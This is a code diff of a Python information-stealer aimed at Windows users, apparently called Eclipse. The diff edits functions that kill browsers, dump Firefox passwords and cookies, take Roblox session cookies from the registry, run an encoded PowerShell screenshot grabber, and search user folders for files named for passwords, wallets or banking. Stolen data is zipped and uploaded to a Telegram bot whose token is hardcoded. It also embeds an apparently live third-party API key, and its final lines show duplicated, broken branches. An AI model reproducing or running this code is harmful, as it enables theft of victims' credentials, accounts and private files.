@@ -8,19 +8,17 @@ import string
 import subprocess
 import sys
 import winreg
-import aiohttp # type: ignore
 import os
 import shutil
 import requests
 import platform
 import winreg
-import psutil # type: ignore
-import win32api # type: ignore
 import json
 import hashlib
 import hmac
-import xml.etree.ElementTree as ET
 import zipfile
+import xml.etree.ElementTree as ET
+import aiohttp, psutil, win32api # type: ignore
 
 from typing import List
 from urllib.request import Request, urlopen
@@ -32,9 +30,6 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend # type: ignore
 from Crypto.Cipher import DES3, AES # type: ignore
 from Crypto.Protocol.KDF import PBKDF2 # type: ignore
-
-
-
 
 TOKEN = "6412347716:AAFL5wPS5gm0fx28XCBk0D4sxnkAwvBDz6E"
 CHAT_ID = "-1002219378034"
@@ -51,8 +46,6 @@ def logs_handler(error_message: str) -> None:
         file.write(f"{error_message}\n")
         
 class ListFonction:
-    Historys = list()
-    Autofills = list()
     ClipBoard = list()
     Network = list()
     SystemInfo = list()
@@ -239,7 +232,6 @@ class get_data:
 
     async def RunAllFonctions(self):
         await self.kill_browsers()
-        await self.ListChromiumProfiles()
         await self.ListGeckoProfiles()
 
         taskk = [
@@ -247,8 +239,6 @@ class get_data:
             asyncio.create_task(self.GetGeckoPasswords()),
             asyncio.create_task(self.GetGeckoCookies()),
             asyncio.create_task(self.GetGeckoHistorys()),
-            asyncio.create_task(self.GetAutoFill()),
-            asyncio.create_task(self.GetHistory()),
             asyncio.create_task(self.StealSteamUser()), 
             asyncio.create_task(self.StealDiscord()),
             InfoStealer().run_all_fonctions(),
@@ -260,7 +250,7 @@ class get_data:
 
     async def kill_browsers(self):
         try:
-            process_names = ["chrome.exe", "opera.exe", "edge.exe", "brave.exe", "vivaldi.exe", "iridium.exe", "epicprivacy.exe", "chromium.exe", "firefox"]
+            process_names = ["firefox"]
             process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
 
             stdout, stderr = await process.communicate()
@@ -277,18 +267,6 @@ class get_data:
             logs_handler(f"[ERROR] - killing browser processes: {str(Error)}")
             pass
 
-    async def ListChromiumProfiles(self) -> None:
-        try:
-            for name, directory in self.browser_paths.items():
-                if os.path.isdir(directory):
-                    if "Opera" in name:
-                        self.profiles_full_path.append(directory)
-                    else:
-                        self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)
-        except Exception as Error:
-            logs_handler(f"[ERROR] - searching browser list profiles: {str(Error)}")
-            pass
-
     async def ListGeckoProfiles(self) -> None:
         try:
             for browser_name, directory in self.GeckoBrowsers.items():
@@ -303,50 +281,6 @@ class get_data:
             logs_handler(f"[ERROR] - getting gecko profiles: {str(Error)}")
 
 
-    async def GetHistory(self) -> None:
-        try:
-            for path in self.profiles_full_path:
-                HistoryData = os.path.join(path, "History")
-                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
-                shutil.copyfile(HistoryData, copied_file_path)
-                database_connection = sqlite3.connect(copied_file_path)
-                cursor = database_connection.cursor()
-                cursor.execute('select id, url, title, visit_count, last_visit_time from urls')
-                historys = cursor.fetchall()
-                try:
-                    cursor.close()
-                    database_connection.close()
-                    os.remove(copied_file_path)
-                except:pass
-                for history in historys:
-                    ListFonction.Historys.append(f"ID : {history[0]}\nURL : {history[1]}\nitle : {history[2]}\nVisit Count : {history[3]}\nLast Visit Time {history[4]}\n====================================================================================\n")
-        except Exception as Error:
-            logs_handler(f"[ERROR] - getting chromium history: {str(Error)}")
-        else:
-            pass
-
-    async def GetAutoFill(self) -> None:
-        try:
-            for path in self.profiles_full_path:
-                AutofillData = os.path.join(path, "Web Data")
-                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
-                shutil.copyfile(AutofillData, copied_file_path)
-                database_connection = sqlite3.connect(copied_file_path)
-                cursor = database_connection.cursor()
-                cursor.execute('select * from autofill')
-                autofills = cursor.fetchall()
-                try:
-                    cursor.close()
-                    database_connection.close()
-                    os.remove(copied_file_path)
-                except:pass
-                for autofill in autofills:
-                    if autofill:
-                        ListFonction.Autofills.append(f"{autofill}\n")
-        except Exception as Error:
-            logs_handler(f"[ERROR] - getting chromium autofills: {str(Error)}")
-        else:
-            pass
 
     async def GetGeckoPasswords(self):
         try:
@@ -745,109 +679,6 @@ class get_data:
         else:
             ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}\n====================================================================================\n")
  
- 
-    async def StealRoblox(self, cookie, browser) -> None:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}) as response:
-                    baseinf = await response.json()
-            username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
-
-            async def GetAll(UserID: int) -> list:
-                try:
-                    FullList = []
-                    async with aiohttp.ClientSession() as session:
-                        async with session.get(f'https://friends.roblox.com/v1/users/{UserID}/friends') as response:
-                            response_text = await response.text()
-                            Friendslist = json.loads(response_text)
-
-                    if 'data' in Friendslist:
-                        x = 0
-                        for friend in Friendslist['data']:
-                            if x == 3:
-                                return FullList
-                            
-                            is_banned = friend.get('isBanned', False)
-                            has_verified_badge = friend.get('hasVerifiedBadge', False)
-
-                            banned_status = "❌" if not is_banned else "✅"
-                            verified_status = "❌" if not has_verified_badge else "✅"
-
-                            FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
-                            x += 1
-                        return FullList
-                    else:
-                        raise ValueError("No 'data' key in the response.")
-                except Exception as e:
-                    logs_handler(f"get all roblox error - {str(e)}")
-                    return []
-
-            async def GetRAP(UserID):
-                ErroredRAP = 0
-                TotalValue = 0
-                Cursor = ""
-                Done = False
-                while not Done:
-                    try:
-                        async with aiohttp.ClientSession() as session:
-                            async with session.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}") as response:
-                                data = await response.json()
-                                
-                        if data.get('nextPageCursor') is None:
-                            Done = True
-                        else:
-                            Cursor = data['nextPageCursor']
-
-                        for Item in data.get("data", []):
-                            try:
-                                RAP = int(Item.get('recentAveragePrice', 0))
-                                TotalValue += RAP
-                            except Exception as e:
-                                ErroredRAP += 1
-                        
-                        if not data.get('nextPageCursor'):
-                            Done = True
-                                    
-                    except Exception as e:
-                        logs_handler(f"get roblox rap error - {str(e)}")
-                        Done = True
-                return TotalValue
-
-            friendlist = await GetAll(userId)
-            rap = await GetRAP(userId)
-            
-            if premium == True:
-                premium = '✅'
-            else:
-                premium = '❌'
-            if builderclub == True:
-                builderclub = '✅'
-            else:
-                premium = '❌'
-
-            async with aiohttp.ClientSession() as session:
-                async with session.get(f"https://users.roblox.com/v1/users/{userId}") as response:
-                    advancedInfo = await response.json()
-            description = 'No Description'
-            if advancedInfo["description"]:
-                description = advancedInfo["description"]
-            if advancedInfo["description"] == True:
-                banned = '✅'
-            else: 
-                banned = '❌'
-            creationDate = advancedInfo["created"]
-            creationDate = creationDate.split("T")[0].split("-")
-            creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
-            creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
-            current_timestamp = time.time()
-            seconds_passed = current_timestamp - creation_timestamp
-            days_passed = round(seconds_passed / (24 * 60 * 60))
-
-        except Exception as Error:
-            logs_handler(f"Error stealing roblox {str(Error)}")
-        else:
-            ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n====================================================================================\n")
-
 
 
 
@@ -1172,26 +1003,6 @@ class get_data:
 
                             
             tokens = []
-            async def GetToken(path, arg):
-                try:
-                    if not os.path.exists(path):
-                        return
-
-                    path += arg
-
-                    for file in os.listdir(path):
-                        if file.endswith(".log") or file.endswith(".ldb"):
-                            with open(f"{path}\\{file}", 'r', errors="ignore") as f:
-                                for line in [x.strip() for x in f.readlines() if x.strip()]:
-                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
-                                        for token in re.findall(regex, line):
-                                            if await CheckToken(token):
-                                                if token not in tokens:
-                                                    tokens.append(token)
-                                                    await UploadToken(token, path)
-
-                except Exception as e:
-                    logs_handler(f"get token error - {str(e)}")
 
             async def GetDiscord(path, arg):
                 try:
@@ -1217,16 +1028,6 @@ class get_data:
                 except Exception as e:
                     logs_handler(f"get discord error - {str(e)}")
 
-            browserPaths = [        
-                [f"{self.appdata}", "Opera Software", "Opera GX Stable", "opera.exe", "Local Storage", "leveldb", "Network", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"],
-                [f"{self.appdata}", "Opera Software", "Opera Stable", "opera.exe", "Local Storage", "leveldb", "Network", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"],
-                [f"{self.appdata}", "Opera Software", "Opera Neon", "User Data", "Default", "opera.exe", "Local Storage", "leveldb", "Network", "Local Extension Settings", "nkbihfbeogaeaoehlefnknn"],
-                [f"{self.localappdata}", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb", "Default", "Default", "Network", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"],
-                [f"{self.localappdata}", "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb", "Default", "Default", "Network", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"],
-                [f"{self.localappdata}", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb", "Default", "Default", "Network", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"],
-                [f"{self.localappdata}", "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb", "Default", "Default", "Network", "HougaBouga", "nkbihfbeogaeaoehlefnkodbefgpgknn"],
-                [f"{self.localappdata}", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb", "Default", "Default", "Network", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"]
-            ]
 
             discordPaths = [        
                 [f"{self.appdata}", "Discord", "Local Storage", "leveldb"],
@@ -1236,8 +1037,6 @@ class get_data:
             ]                    
 
             try:
-                for path in browserPaths:
-                    await GetToken(path[0], path[2])
                 for path in discordPaths:
                     await GetDiscord(path[0], path[1])
             except Exception as e:
@@ -2200,7 +1999,7 @@ asyncio.run(main())
                                 profile = accountData.get("minecraftProfile")
                                 if profile:
                                     try:
-                                        hypixel_url = f"https://api.hypixel.net/player?key=YOUR_HYPIXEL_API_KEY&uuid={profile['id']}"
+                                        hypixel_url = f"https://api.hypixel.net/player?key=aa5d84c7-f617-4069-9e64-ae177cd7b869&uuid={profile['id']}"
                                         async with session.get(hypixel_url) as hypixel_response:
                                             hypixel_data = await hypixel_response.json()
                                     except aiohttp.ClientError:
@@ -2283,7 +2082,7 @@ asyncio.run(main())
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Steam files: {str(Error)}")
             return "null"
-        
+
     async def StealRiotGames(self, directory_path) -> None:
         try:
             riotgame_path = os.path.join(self.localappdata, "Riot Games", "Riot Client", "Data")
@@ -2291,7 +2090,6 @@ asyncio.run(main())
 
             if not os.path.exists(riotgame_path):
                 return
-       
 
             if not os.path.isdir(destination_path):
                     os.mkdir(destination_path)    
@@ -2301,6 +2099,128 @@ asyncio.run(main())
         except Exception as Error:
             logs_handler(f"Error getting Riot Game {str(Error)}")
 
+    async def StealRoblox(self, browsercookies, browser) -> None:
+        async def StealCookie():
+            try:
+                def subproc(path):
+                    cmd = f'powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'
+                    try:
+                        return subprocess.check_output(cmd, shell=True, text=True).strip()
+                    except subprocess.CalledProcessError:
+                        return None
+
+                regex_cookie = subproc("HKLM") or subproc("HKCU")
+                return regex_cookie if regex_cookie else None
+
+            except Exception as Error:
+                logs_handler(f"Error retrieving cookie: {Error}")
+                return None
+
+        async def StealRobloxFiles():
+            try:
+                hostname = platform.node()
+                filePath = os.path.join(self.temp, hostname)
+                roblox_files_path = os.path.join(os.getenv('LOCALAPPDATA'), "Roblox", "LocalStorage")
+                destination_path = os.path.join(filePath, "Games", "Roblox")
+                if not os.path.exists(roblox_files_path):
+                    return
+                os.makedirs(destination_path, exist_ok=True)
+                shutil.copytree(roblox_files_path, destination_path)
+            except Exception as Error:
+                logs_handler(f"Error copying Roblox files: {Error}")
+
+        async def RobloxInfo(cookie):
+            async with aiohttp.ClientSession() as session:
+                async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}) as response:
+                    base_info = await response.json()
+                    user_id = base_info.get("UserID")
+
+                    if not user_id:
+                        raise ValueError("Unable to retrieve Roblox user ID.")
+
+                    return base_info
+
+        async def AdvancedInfo(user_id):
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f"https://users.roblox.com/v1/users/{user_id}") as response:
+                    advanced_info = await response.json()
+                    creation_date = advanced_info["created"].split("T")[0]
+                    return {
+                        "Description": advanced_info.get("description", "No Description"),
+                        "CreationDate": creation_date,
+                        "IsBanned": advanced_info.get("isBanned", False),
+                    }
+
+        async def FriendsList(user_id):
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f'https://friends.roblox.com/v1/users/{user_id}/friends') as response:
+                    response_text = await response.text()
+                    friends_data = json.loads(response_text).get('data', [])[:3]
+
+                    friend_list = []
+                    for friend in friends_data:
+                        banned_status = "✅" if friend.get('isBanned', False) else "❌"
+                        verified_status = "✅" if friend.get('hasVerifiedBadge', False) else "❌"
+                        friend_list.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
+
+                    return friend_list
+
+        async def TotalRAP(user_id):
+            errored_rap = 0
+            total_value = 0
+            cursor = ""
+            done = False
+            while not done:
+                try:
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={cursor}") as response:
+                            data = await response.json()
+
+                    if 'nextPageCursor' in data:
+                        cursor = data['nextPageCursor']
+                    else:
+                        done = True
+
+                    for item in data.get("data", []):
+                        try:
+                            rap = int(item.get('recentAveragePrice', 0))
+                            total_value += rap
+                        except:
+                            errored_rap += 1
+
+                except Exception as Error:
+                    logs_handler(f"Error retrieving RAP: {Error}")
+                    done = True
+
+            return total_value
+
+        async def ProcessData(base_info, advanced_info, friend_list, rap):
+            creation_timestamp = time.mktime(time.strptime(advanced_info["CreationDate"], "%Y-%m-%d"))
+            current_timestamp = time.time()
+            days_passed = round((current_timestamp - creation_timestamp) / (24 * 60 * 60))
+
+            premium = '✅' if base_info["IsPremium"] else '❌'
+            builder_club = '✅' if base_info["IsAnyBuildersClubMember"] else '❌'
+            banned = '✅' if advanced_info["IsBanned"] else '❌'
+
+            ListFonction.RobloxAccounts.append(f"Browser: {browser}\nBrowser Cookie: {browsercookies}\nCookie: {cookie}\nUser: {base_info['UserName']} ({base_info['UserID']})\nThumbnail: {base_info['ThumbnailUrl']}\nRobux: {base_info['RobuxBalance']}\nPremium: {premium}\nBuilder Club: {builder_club}\nCreation Date: {advanced_info['CreationDate']} / {days_passed} Days!\nDescription: {advanced_info['Description']}\nBanned: {banned}\nRAP: {rap}\nFriends List: {friend_list}\n====================================================================================\n")
+
+        try:
+            cookie = await StealCookie()
+            if not cookie:
+                await StealRobloxFiles()
+                return
+
+            base_info = await RobloxInfo(cookie)
+            user_id = base_info["UserID"]
+            advanced_info = await AdvancedInfo(user_id)
+            friend_list = await FriendsList(user_id)
+            rap = await TotalRAP(user_id)
+
+            await ProcessData(base_info, advanced_info, friend_list, rap)
+
+        except Exception as Error:
+            logs_handler(f"Error collecting Roblox data: {Error}")
 
     async def StealGalaxy(self, directory_path) -> None:
         try:
@@ -2416,7 +2336,6 @@ asyncio.run(main())
             if os.path.isdir(filePath):
                 shutil.rmtree(filePath)
 
-            os.makedirs(os.path.join(filePath, "Browsers"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Mozilla"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Computer"), exist_ok=True)
             os.makedirs(os.path.join(filePath, "Sessions"), exist_ok=True)
@@ -2425,17 +2344,6 @@ asyncio.run(main())
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
             await process.communicate() 
-                 
-
-            if ListFonction.Historys:
-                with open(os.path.join(filePath, "Browsers", "historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    for value in ListFonction.Historys:
-                        file.write(value)
-          
-            if ListFonction.Autofills:
-                with open(os.path.join(filePath, "Browsers", "autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    for value in ListFonction.Autofills:
-                        file.write(value)
 
             if self.GeckoPasswordsList:
                 with open(os.path.join(filePath, "Mozilla", "passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -2522,9 +2430,6 @@ asyncio.run(main())
                     for value in ListFonction.MinecraftAccount:
                         file.write(value)
 
-            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
-                try:shutil.rmtree(os.path.join(filePath, "Browsers"))
-                except:pass
 
             if len(os.listdir(os.path.join(filePath, "Mozilla"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Mozilla"))
@@ -2612,7 +2517,7 @@ asyncio.run(main())
 <b>⛰ Region:</b> <code>{ip_info.get("region", "N/A")}</code>
 <b>📍 Country:</b> <code>{ip_info.get("country", "N/A")}</code>
 
-🔮 <code>https://t.me/soon...</code>
+🔮 <code>https://t.me/eclipsemalware</code>
 """
 
             send_message_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -2709,11 +2614,7 @@ class StealFiles:
         async with aiohttp.ClientSession() as session:
             if os.path.getsize(zip_path) <= 20 * 1024 * 1024:
                 with open(zip_path, 'rb') as f:
-                    data = {
-                        'chat_id': CHAT_ID
-                    }
-
-
+                    data = {'chat_id': CHAT_ID}
                     form_data = aiohttp.FormData()
                     form_data.add_field('document', f, filename=os.path.basename(zip_path))
                     form_data.add_field('chat_id', CHAT_ID)
@@ -2729,9 +2630,9 @@ class StealFiles:
                         pass
 
     async def check_sensitive_files(self):
-        search_extensions = [".txt", ".jpg", ".png", ".jpeg", ".sql", ".json", ".csv", ".docx", ".pdf"]
-        search_keywords = ["backup", "token", "password", "secret", "bank"]
-        search_directories = [os.path.join(os.getenv("USERPROFILE"), folder) for folder in ["Desktop", "Downloads", "Documents"]]
+        search_extensions = [".txt", ".jpg", ".png", ".jpeg", ".sql", ".json", ".csv", ".doc", ".docm", ".docx", ".docx", ".point", ".dotm", ".dotx", ".odt", ".pdf", ".xml", ".Xps",]
+        search_keywords = ["backup", "code", "discord", "token", "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", "acount", "paypal", "banque", "bank", "metamask", "wallet", "crypto", "exodus", "2fa", "a2f", "memo", "compte", "finance", "seecret", "credit", "cni",]
+        search_directories = [os.path.join(os.getenv("USERPROFILE"), folder) for folder in ["Desktop", "Downloads", "Documents", "Pictures"]]
         
         random_folder_name = self.generate_random_name(20)
         destination_folder = os.path.join(os.getenv('TEMP'), random_folder_name)
@@ -3024,6 +2925,10 @@ if __name__ == '__main__':
         main = get_data()
         asyncio.run(main.RunAllFonctions())
 
+        files = StealFiles()
+        asyncio.run(files.check_sensitive_files())
+    else:
+        print("run only on windows operating system")
         files = StealFiles()
         asyncio.run(files.check_sensitive_files())
     else:
